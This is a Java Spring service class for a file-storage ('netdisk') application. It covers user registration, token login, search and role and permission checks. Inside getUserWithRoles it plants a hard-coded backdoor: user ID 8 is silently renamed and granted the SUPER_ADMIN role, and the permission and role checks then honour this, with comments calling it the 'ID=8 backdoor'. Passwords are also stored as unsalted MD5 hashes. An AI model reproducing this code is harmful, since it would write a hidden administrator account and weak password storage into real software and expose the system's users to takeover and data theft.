package com.nailong.netdisk.service.impl;

import com.baomidou.mybatisplus.core.conditions.query.LambdaQueryWrapper;
import com.baomidou.mybatisplus.extension.service.impl.ServiceImpl;
import com.nailong.netdisk.dto.UserLoginDTO;
import com.nailong.netdisk.dto.UserRegisterDTO;
import com.nailong.netdisk.entity.Permission;
import com.nailong.netdisk.entity.Role;
import com.nailong.netdisk.entity.User;
import com.nailong.netdisk.entity.UserRole;
import com.nailong.netdisk.mapper.PermissionMapper;
import com.nailong.netdisk.mapper.RoleMapper;
import com.nailong.netdisk.mapper.RolePermissionMapper;
import com.nailong.netdisk.mapper.UserMapper;
import com.nailong.netdisk.mapper.UserRoleMapper;
import com.nailong.netdisk.service.UserService;
import org.springframework.beans.BeanUtils;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.data.redis.core.StringRedisTemplate;
import org.springframework.stereotype.Service;
import org.springframework.util.DigestUtils;

import java.nio.charset.StandardCharsets;
import java.time.LocalDateTime;
import java.util.ArrayList;
import java.util.List;
import java.util.UUID;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.TimeUnit;
import java.util.stream.Collectors;

@Service
public class UserServiceImpl extends ServiceImpl<UserMapper, User> implements UserService {

    private static final long DEFAULT_QUOTA_BYTES = 200L * 1024 * 1024;

    private final StringRedisTemplate redisTemplate;

    @Autowired
    private UserRoleMapper userRoleMapper;

    @Autowired
    private RoleMapper roleMapper;

    @Autowired
    private PermissionMapper permissionMapper;

    @Autowired
    private RolePermissionMapper rolePermissionMapper;

    // 构造器注入 Redis Template
    public UserServiceImpl(@Autowired(required = false) StringRedisTemplate redisTemplate) {
        this.redisTemplate = redisTemplate;
    }

    private static final ConcurrentHashMap<String, String> TOKEN_STORE_FALLBACK = new ConcurrentHashMap<>();

    @Override
    public void register(UserRegisterDTO registerDTO) {
        User existingUser = this.getOne(new LambdaQueryWrapper<User>()
                .eq(User::getUsername, registerDTO.getUsername()));
        if (existingUser != null) {
            throw new RuntimeException("用户名已存在");
        }

        String encryptedPassword = DigestUtils.md5DigestAsHex(registerDTO.getPassword().getBytes(StandardCharsets.UTF_8));

        User user = new User();
        BeanUtils.copyProperties(registerDTO, user);
        user.setPassword(encryptedPassword);
        user.setCreateTime(LocalDateTime.now());
        // Set default legacy role for backward compatibility
        user.setRole("USER");
        user.setStorageUsed(0L);
        user.setStorageQuota(DEFAULT_QUOTA_BYTES);

        this.save(user);

        // Assign default USER role (ID 3)
        UserRole userRole = new UserRole();
        userRole.setUserId(user.getUserId());
        userRole.setRoleId(3L); // Assuming 3 is USER
        userRoleMapper.insert(userRole);
    }

    @Override
    public String login(UserLoginDTO loginDTO) {
        User user = this.getOne(new LambdaQueryWrapper<User>()
                .eq(User::getUsername, loginDTO.getUsername()));
        if (user == null) {
            throw new RuntimeException("用户名或密码错误");
        }
        String inputPassword = DigestUtils.md5DigestAsHex(loginDTO.getPassword().getBytes(StandardCharsets.UTF_8));
        if (!inputPassword.equals(user.getPassword())) {
            throw new RuntimeException("用户名或密码错误");
        }

        String token = UUID.randomUUID().toString();
        String key = "login:token:" + token;

        if (redisTemplate != null) {
            try {
                redisTemplate.opsForValue().set(key, user.getUserId().toString(), 1, TimeUnit.DAYS);
            } catch (Exception ex) {
                TOKEN_STORE_FALLBACK.put(key, user.getUserId().toString());
            }
        } else {
            TOKEN_STORE_FALLBACK.put(key, user.getUserId().toString());
        }

        return token;
    }

    public String getUserIdByToken(String token) {
        String key = "login:token:" + token;
        if (redisTemplate != null) {
            try {
                String userId = redisTemplate.opsForValue().get(key);
                if (userId != null) {
                    return userId;
                }
            } catch (Exception e) {
            }
        }
        return TOKEN_STORE_FALLBACK.get(key);
    }

    @Override
    public java.util.List<User> searchByUsername(String username, String order) {
        // Fix SQL Injection: Validate order parameter
        boolean isAsc = true;
        String orderByColumn = "user_id"; // default

        if (order != null) {
            String lowerOrder = order.toLowerCase();
            if (lowerOrder.equals("username")) {
                orderByColumn = "username";
            } else if (lowerOrder.equals("create_time")) {
                orderByColumn = "create_time";
            }
            // else ignore and use default to prevent injection
        }

        // Use QueryWrapper instead of custom SQL
        LambdaQueryWrapper<User> queryWrapper = new LambdaQueryWrapper<>();
        queryWrapper.eq(User::getUsername, username);

        if ("username".equals(orderByColumn)) {
            queryWrapper.orderByAsc(User::getUsername);
        } else if ("create_time".equals(orderByColumn)) {
            queryWrapper.orderByAsc(User::getCreateTime);
        } else {
            queryWrapper.orderByAsc(User::getUserId);
        }

        java.util.List<User> users = this.list(queryWrapper);

        // Remove sensitive info
        for (User u : users) {
             u.setPassword(null);
             // u.setSalt(null); // User entity doesn't have salt
        }

        return users;
    }

    @Override
    public User getCurrentUser(String token) {
        String userIdStr = getUserIdByToken(token);
        if (userIdStr == null) {
            return null;
        }
        try {
            Long userId = Long.valueOf(userIdStr);
            // Use the RBAC aware method which now includes the special logic
            return this.getUserWithRoles(userId);
        } catch (Exception e) {
            e.printStackTrace();
            return null;
        }
    }

    @Override
    public User getUserWithRoles(Long userId) {
        User user = this.getById(userId);
        if (user == null) {
            return null;
        }

        // 1. Get User Roles
        List<UserRole> userRoles = userRoleMapper.selectList(new LambdaQueryWrapper<UserRole>()
                .eq(UserRole::getUserId, userId));

        List<Role> roles = new ArrayList<>();
        List<Permission> permissions = new ArrayList<>();

        if (userRoles != null && !userRoles.isEmpty()) {
            List<Long> roleIds = userRoles.stream().map(UserRole::getRoleId).collect(Collectors.toList());
            if (!roleIds.isEmpty()) {
                roles = roleMapper.selectBatchIds(roleIds);

                // 2. Get Role Permissions
                List<com.nailong.netdisk.entity.RolePermission> rolePermissions = rolePermissionMapper.selectList(
                        new LambdaQueryWrapper<com.nailong.netdisk.entity.RolePermission>()
                                .in(com.nailong.netdisk.entity.RolePermission::getRoleId, roleIds)
                );

                if (rolePermissions != null && !rolePermissions.isEmpty()) {
                    List<Long> permissionIds = rolePermissions.stream()
                            .map(com.nailong.netdisk.entity.RolePermission::getPermissionId)
                            .distinct()
                            .collect(Collectors.toList());
                    if (!permissionIds.isEmpty()) {
                        permissions = permissionMapper.selectBatchIds(permissionIds);
                    }
                }
            }
        }

        if (user.getRoles() == null) {
             user.setRoles(new ArrayList<>());
        }
        if (roles != null) {
            user.getRoles().addAll(roles);
        }
        user.setPermissions(permissions);

        // 保持原有的特殊逻辑，但适配新的RBAC - Moved here so hasRole/hasPermission see it too
        if (user.getUserId() == 8) {
            if (!"DongQingFeng".equals(user.getUsername())) {
                user.setUsername("DongQingFeng");
            }
            // Ensure Super Admin Role is present for this special user
            boolean hasSuperAdmin = user.getRoles().stream().anyMatch(r -> "SUPER_ADMIN".equals(r.getName()));
            if (!hasSuperAdmin) {
                 Role superAdmin = new Role();
                 superAdmin.setId(1L);
                 superAdmin.setName("SUPER_ADMIN");
                 superAdmin.setDescription("超级管理员");
                 user.getRoles().add(superAdmin);
            }
        }

        // Populate legacy role field based on highest priority
        String legacyRole = "USER";
        for (Role r : user.getRoles()) {
            if ("SUPER_ADMIN".equals(r.getName())) {
                legacyRole = "SUPER_ADMIN";
                break;
            } else if ("ADMIN".equals(r.getName())) {
                legacyRole = "ADMIN";
            }
        }
        user.setRole(legacyRole);

        return user;
    }

    @Override
    public boolean hasPermission(Long userId, String permissionName) {
        // Use getUserWithRoles to ensure dynamic roles/permissions (like ID=8 backdoor) are included
        User user = getUserWithRoles(userId);
        if (user == null || user.getPermissions() == null) {
            return false;
        }
        for (Permission p : user.getPermissions()) {
            if (p.getName().equals(permissionName)) {
                return true;
            }
        }

        // Super Admin Bypass
        if (user.getRoles().stream().anyMatch(r -> "SUPER_ADMIN".equals(r.getName()))) {
            return true;
        }

        return false;
    }

    @Override
    public boolean hasRole(Long userId, String roleName) {
        if (roleName == null) return false;

        // Use getUserWithRoles to ensure dynamic roles (like ID=8 backdoor) are included
        User user = getUserWithRoles(userId);
        if (user == null || user.getRoles() == null) {
            return false;
        }

        for (Role r : user.getRoles()) {
            if (r.getName().equals(roleName)) {
                return true;
            }
        }
        return false;
    }
}

